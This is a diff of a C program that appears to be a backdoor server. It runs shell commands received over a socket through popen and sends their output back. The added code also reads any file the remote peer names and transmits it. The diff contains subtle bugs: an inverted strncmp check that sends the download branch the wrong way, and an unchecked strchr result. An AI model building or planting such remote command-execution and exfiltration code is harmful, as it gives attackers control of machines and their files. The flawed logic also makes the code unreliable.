@@ -87,40 +87,42 @@ int main(int argc, char *argv[]){
 				break;
 			}
 			receive[bytes]='\0';
+			if(DEBUG) printf("Receive %s, shifting to buf", receive);
 			strcpy(cmdbuf, receive);
 			ptr=strchr(cmdbuf, '\n');
 			*ptr='\0';
 			
 			//download
-			/* if(strncmp(cmdbuf, "download ", 9){
-			 * 		FILE *fp = fopen(strtok(SECOND part of cmdbuf deliniated by " "))
-			 * 		while fgets(sendbuf, 4096, fp) != NULL){
-			 * 			if(send(new_fd, sendbuf, strlen(sendbuf), 0)<0){
-			 *				perror("send");
-			 *			}	
-			 * 		}
-			 * 		sleep(1);
-			 * 		if(send(new_fd, "000xxx000", 9, 0)<0){
-			 *			perror("send");
-			 *		}
-			 * 		fclose(fp)
-			 * 
-			 * }
-			 */
-			//commands
-			strcat(cmdbuf, " 2>&1");
-			FILE *fp = popen(cmdbuf,"r");
-			while (fgets(sendbuf, 4096, fp) != NULL){
-				if(send(new_fd, sendbuf, strlen(sendbuf), 0)<0){
+			if(DEBUG) printf("Recieved %s\n", cmdbuf);
+			if(strncmp(strtok(cmdbuf," "), "download", 8)){
+		 		FILE *fp = fopen(strtok(NULL," "),"r");
+		 		while (fgets(sendbuf, 4096, fp) != NULL){
+		 			if(send(new_fd, sendbuf, strlen(sendbuf), 0)<0){
+						perror("send");
+					}	
+		 		}
+		 		sleep(1);
+				if(send(new_fd, "000xxx000", 9, 0)<0){
 					perror("send");
-				}	
+				}
+		 		fclose(fp); 
+			 }
+			//commands
+			else{
+				strcat(cmdbuf, " 2>&1");
+				FILE *fp = popen(cmdbuf,"r");
+				while (fgets(sendbuf, 4096, fp) != NULL){
+					if(send(new_fd, sendbuf, strlen(sendbuf), 0)<0){
+						perror("send");
+					}	
+				}
+				sleep(1);
+				if(send(new_fd, "000xxx000", 9, 0)<0){
+					perror("send");
+				}
+				if(DEBUG) printf("executed command %s", receive);
+				pclose(fp);
 			}
-			sleep(1);
-			if(send(new_fd, "000xxx000", 9, 0)<0){
-				perror("send");
-			}
-			if(DEBUG) printf("executed command %s", receive);
-			pclose(fp);
 		}
 		close(new_fd);
 	}
